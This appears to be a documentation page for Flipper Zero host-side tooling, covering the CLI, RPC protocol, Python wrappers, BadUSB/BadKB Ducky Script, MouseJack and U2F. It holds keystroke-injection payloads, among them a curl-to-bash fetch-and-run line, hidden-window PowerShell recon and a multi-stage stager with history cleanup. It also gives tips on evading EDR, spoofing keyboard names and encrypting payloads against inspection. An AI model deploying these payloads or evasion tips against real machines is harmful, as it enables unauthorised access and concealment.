# Host-side tooling (CLI, RPC, BadUSB, U2F)

Everything that drives a Flipper Zero from outside the Flipper itself: the on-device CLI exposed over USB-CDC, the RPC protobuf protocol used by qFlipper / mobile, BadUSB / Rubber Ducky payloads, and the U2F second-factor application.

## USB CDC — what shows up on your computer

When the Flipper is plugged in (and not in BadUSB / mass-storage / charge-only mode), it presents two USB CDC ACM serial interfaces:

| Interface | Purpose | Default macOS path |
| --- | --- | --- |
| CDC0 | CLI + RPC multiplexed (CLI by default; RPC after `start_rpc_session`) | `/dev/cu.usbmodemflip_*1` |
| CDC1 | Logs (level configurable in `Settings → System → Log level`) | `/dev/cu.usbmodemflip_*3` |

On Linux those are `/dev/ttyACM0` / `/dev/ttyACM1`. On Windows, COM ports.

The Wi-Fi Devboard adds *its own* pair of USB CDC interfaces (Black Magic GDB server + UART passthrough) — different device names, different content.

## CLI — interactive shell over CDC0

Connect with `screen`, `picocom`, `minicom`, `tio`, `ufbt cli`, or qFlipper's CLI tab.

```bash
screen /dev/cu.usbmodemflip_*1 230400
```

You should see:

```
              _.-------.._                    -,
          .-"```"--..,,_/ /`-,               -,  \
       .:"          /:/  /'\  \     ,_...,  `. |  |
      /       ,----/:/  /`\ _\~`_-"`     _;
     '      / /`""".'\ \ \.~`_-'      ,-"'/
    |      | |  0    \ \  / o      ,'`""""""\:.
    |      | |        \ \--------,'        \:.
    |      |  \        \-----.--/         //|
     \      \  \         '-/`,/'    /'  //
      `.   _ '.  '          /__,_/   //
        `-_  '`---'-`'-`'`-`-_'-_/

Welcome to Flipper Zero Command Line Interface!
Read the manual: https://docs.flipper.net
Run `help` to get a list of available commands.

>:
```

### Commands you'll actually use

System / device:

- `help` — list everything available on this firmware.
- `?` — alias for help.
- `device_info` — model, serial, board version, region.
- `power_info` — battery voltage, charge %, temp.
- `power_off` / `reboot` / `reboot2dfu`.
- `uptime` — milliseconds since boot.
- `date` — get/set RTC.
- `factory_reset` — destroys settings (not user data).

Storage:

- `storage list /ext` (or `/int`) — directory listing.
- `storage read /ext/foo.txt`, `storage read_chunks <path> <chunk_size>`.
- `storage write /ext/foo.txt`, `storage write_chunk <path> <size>` then send raw bytes.
- `storage remove`, `storage rename <src> <dst>`, `storage mkdir`, `storage stat`.
- `storage info /ext` — total/free space.
- `storage md5` — checksum, useful for verifying transfers.
- `storage timestamp <path>` — last modified.

Apps and loader:

- `loader list` — installed apps & FAPs.
- `loader open <name>` — launch one (e.g. `loader open Snake`, `loader open "Mifare Classic"`).
- `loader close` — close current.
- `js /ext/apps/Scripts/foo.js` — run a JS script directly.

GPIO / I2C / IO:

- `gpio set <pin> <0|1>` — quick toggling. Pin names: `PA7`, `PA6`, `PB3`, `PC3` etc.
- `gpio read <pin>`.
- `gpio mode <pin> <0..7>` — modes are documented in `furi_hal_resources.h`.
- `i2c get <addr> <reg> <len>` — quick reads.
- `i2c scan` — bus scanner.
- `vibro 0|1`.

Sub-GHz:

- `subghz tx_from_file <path.sub>`.
- `subghz rx [<freq_hz>] [<count>]`.
- `subghz tx <hex_key> <freq> <te>` — quick raw transmit.
- `subghz chat <freq>` — local "walkie-talkie" between two Flippers.

NFC / RFID / iButton (mostly delegate to apps):

- `nfc detect` — wake-up loop, prints UID.
- `rfid read`, `rfid write_t5577 <key_type> <hex>`.
- `ikey read`, `ikey emulate <type> <hex>`.

BLE:

- `bt info`, `bt hci_info`, `bt tx_carrier <ch>`, `bt rx_carrier <ch>`.

Logs:

- `log` — live log stream over the same CLI session (`Ctrl+C` to stop).
- `log <level>` — set level inline (`debug`, `info`, `warn`, `error`).

Hidden / debug-only commands appear when you set `Settings → System → Debug = ON`.

## RPC — protobuf protocol over the same CDC0

Same physical port, different framing. RPC takes over after the host sends `start_rpc_session\r\n` to the CLI; the Flipper responds in [protobuf-encoded `Main` messages](https://github.com/flipperdevices/flipperzero-protobuf).

Available namespaces (one `Main` oneof per request/response):

- **System** — ping, reboot, device info, set datetime, factory reset, get timezone, play notification.
- **Storage** — info, list, read, write, mkdir, delete, rename, md5sum, backup/restore, stat, tar create/extract.
- **App** — start, app exit, app load file, app button press / release, get error, get state, lock status.
- **Gui** — start/stop screen stream, send input event, virtual display.
- **Gpio** — set pin mode, read/write pin, get all pin states.
- **Subghz** — TX from file (with region check); used by Mobile App for replays.
- **Property** — generic key/value getter for system info.
- **Tone player** — play tone via speaker.
- **Desktop** — animation control, idle status.

Frame format: each direction is a stream of length-delimited `PB_Main` messages (varint length, then bytes). Use [nanopb](https://jpa.kapsi.fi/nanopb/) on the device side and any protobuf lib on the host.

### Python: `pyflipper`

The community wrapper most people start with:

```bash
pip install pyflipper
```

```python
from pyflipper.pyflipper import PyFlipper

flipper = PyFlipper(com="/dev/cu.usbmodemflip_*1")
print(flipper.device_info.info())
flipper.storage.list("/ext")
flipper.storage.write("/ext/hello.txt", "hello dolphin")
flipper.notification.success()
flipper.subghz.tx_from_file("/ext/subghz/garage.sub")
```

`pyflipper` shells the CLI under the hood — it's textual, not protobuf. Easy to script, easy to break if the firmware fork renamed a command.

### Python: `flipperzero-protobuf-py`

The proper protobuf path. Pulls in nanopb-generated bindings.

```python
from flipper_proto import FlipperProto
from flipper_proto.flipper_storage import FlipperProtoStorage

proto = FlipperProto(serial_port="/dev/cu.usbmodemflip_*1")
proto.start_rpc_session()
print(proto.cmd_get_device_info())

storage = FlipperProtoStorage(proto)
storage.upload_file("./payload.bin", "/ext/payload.bin")
storage.download_file("/ext/subghz/cap.sub", "./cap.sub")

proto.cmd_stop_session()
```

Pick this when you're building anything serious (a tooling library, a CI pipeline that touches the SD card, a custom mobile app).

### Headless workflow tips

- Always send `\r\n` to terminate CLI commands. Flipper is picky.
- After RPC, the CLI is unavailable on the same channel until you call `Stop session` or reboot.
- For binary transfers prefer the `Storage.write` RPC over `storage write_chunk` CLI — it has explicit length framing so you don't fight escape sequences.
- The Flipper can be the same time being driven by mobile + your script — only one can hold the RPC channel, but the other can use the CLI side.

## BadUSB — Rubber Ducky payloads

The BadUSB app reads `.txt` files from `/ext/badusb/` written in a Flipper-flavored Rubber Ducky DSL (compatible with original Hak5 Ducky Script v1, plus a few extensions).

### DSL reference

```
REM This is a comment

DELAY 500
STRING echo hello from a dolphin
ENTER

GUI r                 # Win+R
DELAY 500
STRING cmd
ENTER

DELAY 1000
STRING cd %TEMP% && curl -s https://example.test/install.sh | bash
ENTER

ALT F4

REPEAT 5             # repeat the *previous* line 5 times
```

| Command | Notes |
| --- | --- |
| `STRING <text>` | Type a literal string (handles spaces). |
| `STRINGLN <text>` | Type then press Enter. |
| `ENTER`, `TAB`, `BACKSPACE`, `DELETE`, `ESC`, `INSERT`, `HOME`, `END`, `PAGEUP`, `PAGEDOWN`, `CAPSLOCK`, `NUMLOCK`, `SCROLLLOCK`, `SPACE`, `MENU`, `PRINTSCREEN`, `PAUSE` | Single key. |
| `UP`, `DOWN`, `LEFT`, `RIGHT` | Arrows. |
| `F1`–`F24`, `NUM0`–`NUM9` | Function and numpad. |
| `CTRL`, `SHIFT`, `ALT`, `GUI` (alias `WINDOWS`, `COMMAND`) | Modifiers, can be chained: `CTRL ALT DELETE`. |
| `DELAY <ms>` | Pause. |
| `DEFAULT_DELAY <ms>` | Pause inserted between every subsequent line. |
| `DEFAULT_STRING_DELAY <ms>` | Pause between each character of `STRING`. |
| `REPEAT <n>` | Repeat the previous line N times. |
| `REM <text>` | Comment. |
| `ALTCHAR <decimal>` | Alt+Numpad code injection (Windows Unicode). |
| `ALTSTRING <text>` | All chars typed via Alt+Numpad (works around layout mismatches). |
| `HOLD <key>` / `RELEASE <key>` | Hold a key/modifier without releasing (chord state). |
| `WAIT_FOR_BUTTON_PRESS` | Wait for the user to press OK on the Flipper before continuing. |

### Keyboard layouts

`/ext/badusb/assets/layouts/` ships with `en-US.kl`, `en-GB.kl`, `de-DE.kl`, `fr-FR.kl`, `es-ES.kl`, `it-IT.kl`, `ru-RU.kl`, etc. Pick the layout that matches the **target machine**, not yours — otherwise `STRING $` becomes `STRING ¤`.

Set the default layout in `Settings → BadUSB → Keyboard Layout`. Or set per-script with the JS `badusb` module's `layoutPath`.

### Common payload patterns

Recon Windows:

```
DEFAULT_DELAY 250
GUI r
DELAY 500
STRING powershell -w h -c "Get-ComputerInfo | Out-File $env:TEMP\info.txt"
ENTER
```

Open a hidden terminal on macOS:

```
DEFAULT_DELAY 200
GUI SPACE          # Spotlight
DELAY 600
STRING terminal
DELAY 400
ENTER
```

Linux quick wallpaper swap:

```
ALT F2
DELAY 400
STRING gsettings set org.gnome.desktop.background picture-uri 'file:///tmp/dolphin.png'
ENTER
```

### BadUSB notes

- The Flipper presents as a USB HID keyboard; from the host's view there is no difference between a Flipper payload and a person typing extremely fast.
- Set the keyboard layout to match the host (`badusb/assets/layouts/`). A US layout typing on a French AZERTY system will produce garbage, especially for symbols.
- Some EDR / kiosk-mode software flags "100 keystrokes in 200 ms"; insert `DELAY 50` after each `STRING` if you need to look human.
- The BadUSB app holds the USB stack — you can't run BadUSB and U2F simultaneously.

## BadKB — BadUSB over Bluetooth LE

Momentum (and a couple of others) ship **BadKB**: same Ducky DSL, same payload directory (`/ext/badusb/`), but the Flipper presents as a **BLE HID keyboard** instead of USB HID. The wins:

- No physical USB connection. Pair the Flipper as a Bluetooth keyboard, sit nearby, fire payload.
- Works against locked phones / tablets / TVs that take BLE keyboards. Modern macOS, Android, iOS, Windows all accept generic BLE HID.
- Range is ~5–10 m unobstructed.

Caveats:

- The target has to **pair** first, and most OSes prompt for a 6-digit confirmation. BadKB has tricks for "JustWorks" pairing on permissive hosts.
- BLE HID throughput is lower than USB — long `STRING` payloads are slower; budget ~50 chars/sec.
- BLE typing is not invisible — it's a paired keyboard, visible in the OS' Bluetooth menu.

Configure the device name from `Apps → Bad KB → Settings`. Common spoofs: `Apple Magic Keyboard`, `Surface Keyboard`, `Logitech K380`. Match the brand of the target host for plausibility.

## Mouse Jiggler and HID mouse

Two related toys:

- **Mouse Jiggler** (FAP, several flavors) — emulates a USB HID mouse and nudges the cursor every N seconds. Defeats screensavers, presence-detection software, and "AFK after 5 min" kicks. Useful as a benign stowaway during long passive captures.
- **HID mouse injection** — the BadUSB app has been extended (Momentum, Unleashed) with `MOVE x y`, `LEFTCLICK`, `RIGHTCLICK`, `MIDDLECLICK`, `WHEEL n` verbs. Combine with `STRING` to drive UIs that demand mouse input (e.g. dialogs that don't take Tab navigation).

Example mixed payload:

```
DELAY 1000
GUI r
DELAY 500
STRING calc
ENTER
DELAY 1500
MOVE 200 200
LEFTCLICK
```

The cursor coordinates are absolute on Windows when the host accepts an absolute-positioning mouse descriptor — by default Flipper sends relative deltas, so `MOVE 200 200` means "200 pixels right, 200 down from current position."

## Encrypted Ducky payloads (`.crypt`)

Some forks support encrypted `.crypt` payloads — same DSL, but stored AES-encrypted on the SD card. Workflow:

1. Author a `payload.txt`.
2. Use the fork's `Apps → BadUSB → Encrypt` (or a host-side `duckyencrypt` script) to produce `payload.crypt` with a passphrase.
3. Distribute the `.crypt` file. To run it, the operator enters the passphrase on the Flipper.

Useful when:

- The SD card may be inspected and you don't want plaintext payloads visible.
- You're shipping payloads to other operators without leaking the source.

The crypto is symmetric AES — there's no key escrow, lose the passphrase and the payload is gone.

## Autorun ↔ mass-storage swap pattern

A common multi-stage trick uses the Flipper's ability to flip its USB persona mid-attack:

1. **HID stage** — boot the host, type out a stager that sets up a download path (e.g. PowerShell that polls a known thumb-drive serial number).
2. **`badusb.quit()`** — release the USB stack.
3. **`usbdisk.start("/ext/disks/payload.img")`** — re-enumerate as a USB mass-storage device. The host's stager picks up the freshly-mounted volume by serial / volume label and pulls the payload.
4. **`usbdisk.stop()`** — disconnect mass storage.
5. Optional: `badusb.setup(...)` again and type `cleanup.txt` (delete temp files, clear PowerShell history).

JS skeleton (see [javascript.md](javascript.md) for full module reference):

```javascript
let badusb  = require("badusb");
let usbdisk = require("usbdisk");
let delay_ms = function (ms) { delay(ms); };

badusb.setup({});
while (!badusb.isConnected()) delay(100);
badusb.println("powershell -w h -c \"" +
  "while (-not (Test-Path E:\\go.bat)) { Start-Sleep 1 }; " +
  "Start-Process E:\\go.bat\"");
delay(800);
badusb.quit();

delay(500);
usbdisk.start("/ext/disks/payload.img");
delay(60000);
usbdisk.stop();
```

The volume label / serial inside `payload.img` is fixed at image-build time (`mkfs.fat -n DOLPHIN -i 0xC0FFEE`). Use that to make the host stager wait for *your* drive specifically rather than the next random USB stick someone plugs in.

## MouseJack — wireless keyboard / mouse injection (NRF24 add-on)

The Flipper itself can't do MouseJack — it has no NRF24 radio. With an NRF24L01+PA+LNA module wired to the GPIO header (commonly via a community **Mousejacker** FAP), the Flipper can replay the BastilleResearch CVE-2016-2225 family.

Targets: unencrypted Logitech Unifying receivers (older firmware), some Microsoft / Dell / HP wireless keyboard receivers using NRF24L01-derived radios.

Wiring (NRF24 module → Flipper GPIO):

```
NRF24 VCC  → pin 9   (3V3)
NRF24 GND  → pin 11  (GND)
NRF24 SCK  → pin 5   (PB3)
NRF24 MISO → pin 3   (PA6)
NRF24 MOSI → pin 2   (PA7)
NRF24 CSN  → pin 4   (PA4)
NRF24 CE   → pin 6   (PB2)
NRF24 IRQ  → not connected
```

Workflow with the **NRF24 Mousejack** FAP:

1. `Apps → GPIO → NRF24 Mousejack → Sniff`.
2. The FAP scans 2.4 GHz channels for unencrypted dongles, prints discovered addresses.
3. `Inject` → choose a captured address → choose a Ducky payload from `/ext/badusb/`.
4. The NRF24 sends keystrokes that the unencrypted dongle accepts as if from its paired keyboard.

Logitech rolled out firmware patches starting in 2019 — newer receivers ignore unsigned packets. Older ones still in the field don't.

The same NRF24 + Flipper combo runs **NRF24 Sniffer**, **NRF24 Scan** (channel surveys), and **Mousejacker** under different naming conventions across forks. Same hardware, same idea.

## U2F — second factor security key

The Flipper implements **FIDO U2F** (CTAP1) over USB HID. It does not implement FIDO2 / WebAuthn / passkeys, and it cannot present as a different existing security key because U2F includes per-key attestation and per-site key derivation.

Setup:

1. `Apps → U2F → Generate Token` — creates a fresh device cert + master secret on the SD card (`/ext/u2f/`).
2. Plug Flipper into your computer.
3. Visit a U2F-capable site (GitHub, Google, …).
4. "Add security key" → press a button on Flipper when prompted.

Each registration creates a per-site key handle stored in the relying party's database; the Flipper derives the corresponding private key from its master secret on demand. This means:

- Backups: copy `/ext/u2f/*` (encrypted device-side; a backup is useful if the SD card dies).
- **Do not check `/ext/u2f/` into version control.** Even though the data is encrypted on-card, the secrets should not leave your custody.
- If the master secret is compromised, every site you registered with this Flipper as a U2F key needs to be re-enrolled with a new key.

The Flipper's U2F is a *second factor*. There is no built-in "dump U2F key" function — the master secret stays in the SD-card secure store and the per-site keys are derived on demand.

## Putting it together

A typical loop for a multi-mode session:

1. Write a host Python script with `pyflipper` that uploads a payload `.txt`, sets the BadUSB layout, and starts the BadUSB app.
2. Plug the Flipper into the target host.
3. Press OK on the Flipper to start typing.
4. Disconnect, swap to a different mode (Sub-GHz / NFC / U2F), repeat.

For everything that won't work as expected — region TX blocks, rolling-code receivers, secure-element NFC, layout-mismatched BadUSB — see [limits.md](limits.md).
